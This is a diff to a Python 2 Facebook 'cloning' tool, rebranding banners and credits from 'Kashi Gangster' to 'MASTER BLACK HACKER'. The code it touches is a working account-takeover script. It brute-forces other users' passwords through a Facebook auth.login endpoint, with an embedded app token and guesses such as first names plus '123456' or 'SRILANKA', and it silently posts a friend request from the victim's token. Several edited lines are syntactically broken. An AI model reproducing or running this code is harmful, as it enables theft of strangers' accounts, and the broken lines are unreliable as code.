@@ -48,17 +48,26 @@ def jalan(z):
 
 #### LOGO ####
 logo = """
-\033[1;91m          _             ____       
-\033[1;91m         | |           |___ \      
-\033[1;92m      ___| | ___  _ __   __) |_ __  Updated ⭐⚡
-\033[1;92m     / __| |/ _ \| '_ \ |__ <| '__|
-\033[1;93m    | (__| | (_) | | | |___) | |   
-\033[1;93m     \___|_|\___/|_| |_|____/|_|   
+\033[1;91m       
+
+╭━━╮╭╮╱╱╱╱╱╱╭╮╱╱╭╮╱╱╱╱╱╱╱╭╮
+
+┃╭╮┃┃┃╱╱╱╱╱╱┃┃╱╱┃┃╱╱╱╱╱╱╱┃┃
+
+┃╰╯╰┫┃╭━━┳━━┫┃╭╮┃╰━┳━━┳━━┫┃╭┳━━┳━╮
+
+┃╭━╮┃┃┃╭╮┃╭━┫╰╯╯┃╭╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯
+
+┃╰━╯┃╰┫╭╮┃╰━┫╭╮╮┃┃┃┃╭╮┃╰━┫╭╮┫┃━┫┃
+
+╰━━━┻━┻╯╰┻━━┻╯╰╯╰╯╰┻╯╰┻━━┻╯╰┻━━┻╯
 \033[1;93m🔥╭╬──────────────────────────────────╬╮🔥
-\033[0;94m  ⚡ ✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗 ✪ 𝐊𝐚𝐬𝐡𝐢 𝐆𝐚𝐧𝐠𝐬𝐭𝐞𝐫   ✬⚡
-\033[0;94m  ⚡ ✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ✪ 𝐆𝐚𝐧𝐠𝐬𝐭𝐞𝐫 𝐓𝐞𝐚𝐜𝐡 ✬⚡
-\033[0;97m  ⚡ ✯ 𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊 ✬⚡
-\034[0;92m  ⚡  ❥WhatsApp  Num +923062045786 ツ
+\033[0;94m   ♥     ✘✘✘     ＭＡＳＴＥＲ     ✘✘✘      ♥
+\033[0;94m              ＢＬＡＣＫ ＨＡＣＫＥＲ
+                      
+		      ▄ █ ▄ █ ▄ ▄ █ ▄ █ ▄ █
+\033[0;97m 
+\034[0;92m   ♥       ❥ 𝙵𝚋 𝙽𝚊𝚖𝚎 := 𝚠𝚒𝚜𝚑𝚟𝚊 𝚓𝚊𝚢 ツ      ♥
 \033[1;93m🔥╰╬──────────────────────────────────╬╯🔥 """
                                                 
 def tik():
@@ -78,12 +87,18 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\033[1;97m _  __           _____ _    _ _____ 
-\033[1;97m| |/ /    /\    / ____| |  | |_   _|VIRSON 0.2⚡
-\033[1;97m | ' /    /  \  | (___ | |__| | | |  
-\033[1;97m |  <    / /\ \  \___ \|  __  | | |  
-\033[1;97m| . \  / ____ \ ____) | |  | |_| |_ 
-\033[1;97m |_|\_\/_/    \_\_____/|_|  |_|_____|"""
+
+╭━━╮╭╮╱╱╱╱╱╱╭╮╱╱╭╮╱╱╱╱╱╱╱╭╮
+
+┃╭╮┃┃┃╱╱╱╱╱╱┃┃╱╱┃┃╱╱╱╱╱╱╱┃┃
+
+┃╰╯╰┫┃╭━━┳━━┫┃╭╮┃╰━┳━━┳━━┫┃╭┳━━┳━╮
+
+┃╭━╮┃┃┃╭╮┃╭━┫╰╯╯┃╭╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯
+
+┃╰━╯┃╰┫╭╮┃╰━┫╭╮╮┃┃┃┃╭╮┃╰━┫╭╮┫┃━┫┃
+
+╰━━━┻━┻╯╰┻━━┻╯╰╯╰╯╰┻╯╰┻━━┻╯╰┻━━┻╯
 
 jalan("\033[1;96m•◈•────────────•◈•\033[1;99mKashiGangster\033[1;99m•◈•────────────•◈•")                        
 jalan("\033[1;96m  ___ _    __   __  _  ___  ___ ")  
@@ -95,8 +110,8 @@ jalan("\033[1;97m WIFI USER USE ANY PROXY TO CLONE")
 jalan("\033[1;93m Welcome to Kashi Gangster")
 jalan("\033[1;96m•◈•──────────•◈•\033[1;96mKashiGangster\033[1;96m•◈•──────────•◈•")
 
-CorrectUsername = "Cloner"
-CorrectPassword = "kashigangster"
+CorrectUsername = wishva
+CorrectPassword = MASTER
 
 loop = 'true'
 while (loop == 'true'):
@@ -109,10 +124,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;96mWrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
+            os.system 
     else:
         print "\033[1;96mWrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
+        os.system
 
 def login():
 	os.system('clear')
@@ -152,8 +167,8 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
+				print '\n\033[1;96m[✓] \x1b[1;92m Log huththo 
+				os.system
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -165,7 +180,7 @@ def login():
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email ghalat hai")
+			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email )
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -191,7 +206,7 @@ def menu():
 		sub = str(b['summary']['total_count'])
 	except KeyError:
 		os.system('clear')
-		print"\033[1;91mYour Account is on Checkpoint"
+		print"\033[1;91m Ａｄｏ ｎｏ ｂｎｇ Ｂｌｏｃｋ "
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -206,7 +221,7 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;36;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
 	print "\033[1;32;40m[1] \033[1;33;41mHack The World"	
-	print "\033[1;32;40m[2] \033[1;33;42mUpdate Kashi Gangster"																														
+	print "\033[1;32;40m[2] \033[1;33;42mUpdate wishva"																														
 	print "\033[1;32;40m[0] \033[1;33;43mLog out"
 	pilih()
 	
@@ -352,7 +367,7 @@ def pilih_super():
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
-							pass3 = b['first_name'] + '12345'
+							pass3 = b['first_name'] + '123456'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
@@ -408,7 +423,7 @@ def pilih_super():
 															cek.close()
 															cekpoint.append(user+pass6)
 														else:
-															pass7 = 'Pakistan'
+															pass7 = 'SRILANKA'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
